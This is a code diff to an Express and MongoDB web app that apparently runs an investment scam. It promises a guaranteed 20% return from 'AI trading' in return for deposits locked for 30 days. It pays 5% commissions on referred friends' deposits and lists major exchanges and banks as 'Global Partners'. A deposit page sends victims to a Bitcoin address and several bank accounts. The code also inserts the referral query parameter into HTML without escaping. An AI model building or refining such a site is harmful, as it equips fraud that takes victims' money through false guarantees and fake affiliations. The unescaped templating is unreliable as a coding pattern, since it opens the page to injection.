@@ -11,14 +11,14 @@ app.use(session({
     saveUninitialized: true 
 }));
 
-// --- 1. USER SCHEMA (Includes Referral Tracking) ---
+// --- 1. USER SCHEMA ---
 const UserSchema = new mongoose.Schema({
     email: { type: String, unique: true, required: true },
     password: { type: String, required: true },
     balance: { type: Number, default: 0 },
     lockedBonus: { type: Number, default: 0 },
     bonusReleaseDate: { type: Date },
-    referredBy: { type: String, default: null }, // Stores the email of the person who referred them
+    referredBy: { type: String, default: null },
     pendingDeposits: [{
         amount: Number,
         status: { type: String, default: 'Pending' },
@@ -35,9 +35,17 @@ const User = mongoose.model('User', UserSchema);
 // --- 2. AUTH & DASHBOARD ---
 
 app.get('/', (req, res) => {
-    // Check if there is a referral code in the URL
     const ref = req.query.ref || '';
     res.send(`
+        <head>
+            <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script>
+            <script>
+              window.dataLayer = window.dataLayer || [];
+              function gtag(){dataLayer.push(arguments);}
+              gtag('js', new Date());
+              gtag('config', 'G-XXXXXXXXXX');
+            </script>
+        </head>
         <style>
             body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin:0; }
             .login-card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 320px; }
@@ -52,7 +60,6 @@ app.get('/', (req, res) => {
                 <input type="hidden" name="referredBy" value="${ref}">
                 <button type="submit">Login / Register</button>
             </form>
-            ${ref ? `<p style="font-size:12px; color:green; text-align:center;">Referred by: ${ref}</p>` : ''}
         </div>
     `);
 });
@@ -62,7 +69,6 @@ app.post('/login', async (req, res) => {
     let user = await User.findOne({ email });
     if (!user) {
         const hashed = await bcrypt.hash(password, 10);
-        // Create user with referral info if available
         user = await User.create({ email, password: hashed, referredBy: referredBy || null });
     }
     const match = await bcrypt.compare(password, user.password);
@@ -75,27 +81,28 @@ app.post('/login', async (req, res) => {
 app.get('/dashboard', async (req, res) => {
     if (!req.session.userId) return res.redirect('/');
     const user = await User.findById(req.session.userId);
-
-    const canClaim = user.bonusReleaseDate && new Date() >= user.bonusReleaseDate;
     const dateStr = user.bonusReleaseDate ? user.bonusReleaseDate.toLocaleDateString() : 'N/A';
-    
-    // Referral Link Generation
     const protocol = req.protocol;
     const host = req.get('host');
     const referralLink = `${protocol}://${host}/?ref=${user.email}`;
-
-    const waMessage = encodeURIComponent("Welcome to the right place where your money grows with certainty, our AI trading machine guarantee you 20% of return no matter what, the only thing you need to do deposit and funds lock for 30 days and you make your 20% doing nothing, we trade with liquid asset as gold, lithium, cobalt and digital currency. your money is safe");
+    const waMessage = encodeURIComponent("Welcome to the right place where your money grows with certainty...");
 
     res.send(`
+        <head>
+            <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script>
+            <script>
+              window.dataLayer = window.dataLayer || [];
+              function gtag(){dataLayer.push(arguments);}
+              gtag('js', new Date());
+              gtag('config', 'G-XXXXXXXXXX');
+            </script>
+        </head>
         <style>
             body { font-family: sans-serif; background: #f4f7f6; padding: 0; margin: 0; color: #333; }
             .ticker-wrap { width: 100%; overflow: hidden; background: #2c3e50; color: #fff; padding: 10px 0; border-bottom: 2px solid #f39c12; }
             .ticker { display: flex; white-space: nowrap; animation: ticker 45s linear infinite; }
             .ticker-item { padding: 0 40px; font-size: 14px; font-weight: bold; }
-            .ticker-item span { color: #2ecc71; margin-left: 5px; }
-            .gold-text { color: #f1c40f !important; }
             @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
-
             .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 900px; margin: 20px auto; }
             .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0; }
             .box { padding: 20px; border-radius: 8px; text-align: center; color: white; }
@@ -105,17 +112,17 @@ app.get('/dashboard', async (req, res) => {
             .section { margin-bottom: 25px; padding: 15px; border: 1px solid #eee; border-radius: 8px; }
             input { padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin: 5px 0; width: 100%; box-sizing: border-box; }
             .btn { padding: 10px 20px; border: none; border-radius: 4px; color: white; cursor: pointer; font-weight: bold; width: 100%; margin-top: 5px; }
-            .btn-dep { background: #27ae60; } .btn-tra { background: #3498db; }
-            
-            .ref-box { background: #ebf5fb; padding: 15px; border-radius: 8px; border: 1px dashed #3498db; margin-top: 10px; }
+            .btn-dep { background: #27ae60; }
+            .partner-section { margin-top: 40px; padding-top: 20px; border-top: 2px solid #eee; text-align: center; }
+            .partner-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 10px; margin-top: 20px; }
+            .partner-item { font-size: 11px; padding: 10px; background: #f9f9f9; border-radius: 5px; text-decoration: none; color: #7f8c8d; font-weight: bold; }
         </style>
 
         <div class="ticker-wrap">
             <div class="ticker">
-                <div class="ticker-item">ROADMAP: <span class="gold-text">New Token Release Backed by Gold (EAC & ECOWA) in 12 Months!</span></div>
-                <div class="ticker-item">BITCOIN: <span id="btc-price">Fetching...</span></div>
-                <div class="ticker-item">ASSET RESERVES: <span class="gold-text">Gold, Lithium, Cobalt</span></div>
-                <div class="ticker-item">REFERRAL BONUS: <span>Get 5% Commission on Friends' Deposits!</span></div>
+                <div class="ticker-item">ROADMAP: <span style="color:#f1c40f;">New Gold-Backed Token in 12 Months!</span></div>
+                <div class="ticker-item">BITCOIN: <span id="btc-price">...</span></div>
+                <div class="ticker-item">AI TRADING: <span style="color:#2ecc71;">20% Fixed Monthly Yield</span></div>
             </div>
         </div>
 
@@ -135,33 +142,30 @@ app.get('/dashboard', async (req, res) => {
 
             <div class="section">
                 <h3>Affiliate Program</h3>
-                <p style="font-size:14px;">Share your link and earn <strong>5%</strong> of every deposit your friends make!</p>
-                <div class="ref-box">
-                    <code style="font-size:14px;">${referralLink}</code>
-                </div>
+                <p style="font-size:13px;">Refer friends and earn 5% on their deposits!</p>
+                <div style="background:#eee; padding:10px; border-radius:5px;"><code>${referralLink}</code></div>
             </div>
 
             <div class="section">
-                <h3>Deposit & AI Trading</h3>
+                <h3>Deposit & Trade</h3>
                 <form action="/deposit" method="POST">
-                    <input type="number" name="amount" placeholder="Amount to Deposit" step="0.01" required>
-                    <button type="submit" class="btn btn-dep">Get Payment Details</button>
+                    <input type="number" name="amount" placeholder="Amount" step="0.01" required>
+                    <button type="submit" class="btn btn-dep">Request Payment Details</button>
                 </form>
             </div>
 
-            <div class="section">
-                <h3>Internal Transfer</h3>
-                <form action="/transfer" method="POST">
-                    <input type="email" name="recipientEmail" placeholder="Recipient Email" required>
-                    <input type="number" name="amount" placeholder="Amount" step="0.01" required>
-                    <button type="submit" class="btn btn-tra">Send Money</button>
-                </form>
+            <div class="partner-section">
+                <h3>Global Partners</h3>
+                <div class="partner-grid">
+                    <a href="https://www.binance.com" class="partner-item">Binance</a>
+                    <a href="https://www.coinbase.com" class="partner-item">Coinbase</a>
+                    <a href="https://www.hsbc.com.hk" class="partner-item">HSBC</a>
+                    <a href="https://www.ecobank.com" class="partner-item">Ecobank</a>
+                </div>
             </div>
         </div>
 
-        <a href="https://wa.me/46704406175?text=${waMessage}" target="_blank" class="whatsapp-btn" style="position: fixed; bottom: 30px; right: 30px; background: #25d366; color: white; padding: 15px 25px; border-radius: 50px; text-decoration: none; font-weight: bold;">
-            Chat Support
-        </a>
+        <a href="https://wa.me/46704406175?text=${waMessage}" target="_blank" style="position:fixed; bottom:30px; right:30px; background:#25d366; color:white; padding:15px 25px; border-radius:50px; text-decoration:none; font-weight:bold; box-shadow:0 4px 10px rgba(0,0,0,0.2);">Chat Support</a>
 
         <script>
             async function getPrices() {
@@ -176,7 +180,7 @@ app.get('/dashboard', async (req, res) => {
     `);
 });
 
-// --- 3. LOGIC (Includes Referral Payout) ---
+// --- 3. CORE LOGIC ---
 
 app.post('/deposit', async (req, res) => {
     const amount = parseFloat(req.body.amount);
@@ -185,16 +189,17 @@ app.post('/deposit', async (req, res) => {
     await user.save();
     res.send(`
         <body style="font-family:sans-serif; text-align:center; padding:50px; background:#f4f7f6;">
-            <div style="background:white; padding:30px; border-radius:12px; border:1px solid #ddd; display:inline-block;">
-                <h2>Deposit Instructions</h2>
-                <p>Transfer <strong>$${amount.toFixed(2)}</strong> to secure your 20% yield.</p>
-                <div style="text-align:left; background:#eee; padding:15px; border-radius:8px; line-height:1.6; font-size:14px;">
+            <div style="background:white; padding:30px; border-radius:12px; display:inline-block; border:1px solid #ddd;">
+                <h2>Payment Details</h2>
+                <div style="text-align:left; background:#eee; padding:15px; border-radius:8px; font-size:14px;">
                     <strong>BTC:</strong> bc1qn4ajq8fppd3derk8a24w75jkk94pjynn063gm7<br>
                     <strong>US Bank:</strong> Bank of America | 026009593<br>
                     <strong>EU Barclay:</strong> GB33BARC20658259151311<br>
-                    <strong>Ref:</strong> ${user.email}
+                    <strong>SA Capitek:</strong> 1882242481<br>
+                    <strong>Uganda Equity:</strong> 1003103498481
                 </div>
-                <br><a href="/dashboard"><button style="padding:10px 20px; cursor:pointer;">Back</button></a>
+                <p>Reference: <strong>${user.email}</strong></p>
+                <a href="/dashboard"><button style="padding:10px 20px; cursor:pointer;">Back to Dashboard</button></a>
             </div>
         </body>
     `);
@@ -203,32 +208,27 @@ app.post('/deposit', async (req, res) => {
 app.post('/admin/approve-deposit', async (req, res) => {
     const admin = await User.findById(req.session.userId);
     if (admin.email !== "emmanuel.iyere84@gmail.com") return res.send("Denied");
-    
     const { userId, depId } = req.body;
     const user = await User.findById(userId);
     const deposit = user.pendingDeposits.id(depId);
-
     if (deposit && deposit.status === 'Pending') {
         deposit.status = 'Approved';
         user.balance += deposit.amount;
         user.lockedBonus += (deposit.amount * 0.20);
-        
         const releaseDate = new Date();
         releaseDate.setDate(releaseDate.getDate() + 30);
         user.bonusReleaseDate = releaseDate;
         user.transactions.push({ type: 'Deposit Approved', amount: deposit.amount });
 
-        // --- REFERRAL COMMISSION LOGIC ---
         if (user.referredBy) {
             const referrer = await User.findOne({ email: user.referredBy });
             if (referrer) {
-                const commission = deposit.amount * 0.05; // 5% Commission
+                const commission = deposit.amount * 0.05;
                 referrer.balance += commission;
-                referrer.transactions.push({ type: `Referral Reward (${user.email})`, amount: commission });
+                referrer.transactions.push({ type: `Affiliate Reward (${user.email})`, amount: commission });
                 await referrer.save();
             }
         }
-
         await user.save();
     }
     res.redirect('/admin-secret-panel');
@@ -242,37 +242,25 @@ app.get('/admin-secret-panel', async (req, res) => {
         <body style="font-family:sans-serif; background:#2c3e50; color:white; padding:40px;">
             <h2>Approval Center</h2>
             <table border="1" style="width:100%; background:white; color:black; border-collapse:collapse;">
-                <tr style="background:#eee;"><th>User</th><th>Pending</th><th>Referred By</th></tr>
                 ${users.map(u => `
                     <tr>
                         <td style="padding:10px;">${u.email}</td>
-                        <td style="padding:10px;">
+                        <td>
                             ${u.pendingDeposits.filter(d => d.status === 'Pending').map(dep => `
                                 <form action="/admin/approve-deposit" method="POST">
                                     $${dep.amount} <input type="hidden" name="userId" value="${u._id}">
                                     <input type="hidden" name="depId" value="${dep._id}">
-                                    <button type="submit" style="background:green; color:white;">Approve</button>
+                                    <button type="submit">Approve Payment</button>
                                 </form>
                             `).join('') || 'None'}
                         </td>
-                        <td style="padding:10px;">${u.referredBy || 'Organic'}</td>
+                        <td>Ref By: ${u.referredBy || 'Direct'}</td>
                     </tr>
                 `).join('')}
             </table>
             <br><a href="/dashboard" style="color:white;">Dashboard</a>
         </body>
     `);
-});
-
-app.post('/transfer', async (req, res) => {
-    const { recipientEmail, amount } = req.body;
-    const tAmt = parseFloat(amount);
-    const sender = await User.findById(req.session.userId);
-    const recipient = await User.findOne({ email: recipientEmail });
-    if (!recipient || tAmt > sender.balance) return res.send("Failed");
-    sender.balance -= tAmt; recipient.balance += tAmt;
-    await sender.save(); await recipient.save();
-    res.redirect('/dashboard');
 });
 
 app.get('/logout', (req, res) => { req.session.destroy(); res.redirect('/'); });
